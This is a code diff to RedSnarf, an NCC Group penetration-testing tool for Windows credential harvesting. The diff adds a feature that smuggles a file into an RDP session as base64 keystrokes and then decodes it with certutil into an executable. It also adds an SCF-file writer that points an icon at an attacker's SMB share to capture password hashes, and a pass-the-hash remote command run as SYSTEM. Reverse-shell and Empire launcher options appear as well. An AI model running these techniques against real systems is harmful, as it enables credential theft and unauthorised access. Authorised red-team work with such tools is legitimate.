@@ -6,7 +6,32 @@
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
 import socket, fcntl, struct, time, base64, logging, urllib
 
+import time
 import xml.etree.ElementTree as ET
+
+try:
+	from docopt import docopt
+except ImportError:
+	print("You need to install docopt")
+	print("pip install docopt")
+	logging.error("docopt missing")
+	exit(1)
+
+try:
+	from pykeyboard import PyKeyboard
+except ImportError:
+	print("You need to install pyuserinput")
+	print("pip install pyuserinput")
+	logging.error("pyuserinput missing")
+	exit(1)
+
+try:
+	from pymouse import PyMouseEvent
+except ImportError:
+	print("You need to install pyuserinput")
+	print("pip install pyuserinput")
+	logging.error("pyuserinput missing")
+	exit(1)
 
 try:
 	import wget
@@ -108,6 +133,10 @@ def banner():
 	print colored("\nE D Williams - NCCGroup",'red')
 	print colored("R Davy - NCCGroup\n",'red')
 
+class AbortMouse(PyMouseEvent):
+	def click(self, x, y, button, press):
+		if press:
+			self.stop()
 
 # hardcoded XOR key
 KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")
@@ -948,11 +977,14 @@ def datadump(user, passw, host, path, os_version):
 		print colored("[+]Exiting as other features will not work at the minute with this configuration, Sorry!!: ",'yellow')
 		exit(1)
 
-	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
-	signal_number = (return_value & 0x0F)
-	if not signal_number:
-		exit_status = (return_value >> 8)
-		if exit_status:
+	#Run a whoami on the remote box	
+	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C whoami \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+	services = proc.communicate()[0]
+
+	#If reply is not blank
+	if services!="":
+		#We ran the check as system so if not returned bomb out.
+		if not "nt authority\system" in services:
 			print colored("[-]Something went wrong connecting to: "+host,'red')
 		else:
 			if not os.path.exists(path+host):
@@ -1836,7 +1868,7 @@ def run():
 			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10,preferredDialect=SMB_DIALECT)
 			dialect = smbClient.getDialect()
 			if dialect == SMB_DIALECT:
-				print colored("[!]WARNING - SMBV1 Accepted",'red')
+				print colored("[!]WARNING - SMBv1 Accepted",'red')
 				smbClient.logoff()
 
 			#Initiate Proper Connection here
@@ -1851,6 +1883,13 @@ def run():
 				print "[+]SMBv2.1 dialect used"
 			else:
 				print "[+]SMBv3.0 dialect used"
+
+			#Check for SMB Signing
+			#print smbClient.isSigningRequired()
+			#if smbClient.isSigningRequired():
+			#	print "[+]SMB Signing Required"
+			#else:
+			#	print "[+]SMB Signing Not Required"
 
 			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
 					
@@ -2563,7 +2602,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5m", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5o", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2585,6 +2624,7 @@ ugroup.add_argument("-uCP", "--custom_powershell", dest="custom_powershell", def
 ugroup.add_argument("-uCIDR", "--cidr", dest="cidr", default="", help="<Optional> Convert CIDR representation to ip, hostmask, broadcast")
 ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
+ugroup.add_argument("-uFT", "--file_transcribe", dest="file_transcribe", default="n", help="<Optional> Converts a file to base64 then sends via SendKeys")
 ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
 ugroup.add_argument("-uMC", "--mcafee_sites", dest="mcafee_sites", default="n", help="<Optional> Decrypt Mcafee Sites Password")
 ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
@@ -2600,7 +2640,10 @@ ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<
 ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
 ugroup.add_argument("-uRS", "--snarf_shell", dest="snarf_shell", default="n", help="<Optional> Start Reverse Listening Snarf Shell")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
+
 ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="<Optional> Split SPN File")
+ugroup.add_argument("-uSCF", "--scf_creator", dest="scf_creator", default="n", help="<Optional> Create an SCF file for some SMB hash capturing fun")
+
 ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
 ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
@@ -2717,6 +2760,8 @@ windows_updates=args.windows_updates
 xscript=args.xscript
 mcafee_sites=args.mcafee_sites
 snarf_shell=args.snarf_shell
+scf_creator=args.scf_creator
+file_transcribe=args.file_transcribe
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
@@ -2743,6 +2788,79 @@ if args.password=='epass':
 	usr_response = raw_input("Enter the password here: ")
 	args.password=usr_response
 	passw=args.password
+
+if file_transcribe!='n':
+	try:
+		filename=raw_input("Enter name and path of a file to transcribe: ")
+		if not os.path.isfile(filename):
+			print colored("[!] File not found ",'red')
+			sys.exit(1)
+		else:
+			b64filename="/tmp/snarftrans.b64"
+			os.system("base64 -w 0 "+filename+"> "+b64filename)
+			
+		#Modify these if necessary
+		#TODO make read in values
+		interval=float("0.1")
+		pause=float("10")
+		
+		#Get an instance of PyKeyboard, and our custom PyMouseEvent
+		keyboard = PyKeyboard()
+		mouse = AbortMouse()
+
+		print colored("\n[?]Have you got a text editor open ready to receive ",'red')
+		print colored("[?]keyboard input in your RDP Window?\n",'red')
+		
+		raw_input('Press Enter when ready.')
+		
+		print colored(('\n[!]Typing will begin in {0} seconds...'.format(pause)),'red')
+		print colored("[!]Give focus to the open text editor in your RDP Window Now!!",'red')
+		time.sleep(pause)
+
+		mouse.start()
+		with open(b64filename, 'r') as readfile:
+			for line in readfile:
+				if not mouse.state:
+					print colored("Typing aborted!",'red')
+					break
+				keyboard.type_string(line, interval)
+
+		print colored("\n[+]Done!\n",'green')
+		print colored("[+]On the remote machine save file e.g. filename.b64 then decode using",'yellow')
+		print colored("[+]certutil -decode filename.b64 filename.exe",'yellow')
+	
+	except ValueError:
+		print('The value of --interval must be a number')
+		sys.exit(1)
+
+	sys.exit()
+
+if scf_creator!='n':
+	try:
+		#SCF File Writer
+		print colored("[+]SCF File Writer",'green')
+		
+		outputfile=raw_input("[+]Enter filename to save as: ")
+		inputip=raw_input("[+]Please enter listening IP address: ")
+
+		if not outputfile.endswith(".scf"):
+			outputfile=outputfile+".scf"
+
+		# read arg
+		f = open("/tmp/"+outputfile,"w")
+		f.write("[Shell]\n")
+	   	f.write("Command=2\n")
+	   	f.write("IconFile=\\\\" + inputip + "\share\\test.ico\n")
+	   	f.write("[Taskbar]\n")
+	   	f.write("Command=ToggleDesktop\n")
+	   	f.close()
+	   	print "[+]File Written " + "/tmp/" + outputfile
+		
+	except:
+		print colored("[!]Something went wrong...",'red')
+		sys.exit()
+
+	sys.exit()
 
 if mcafee_sites!='n':
 	try:
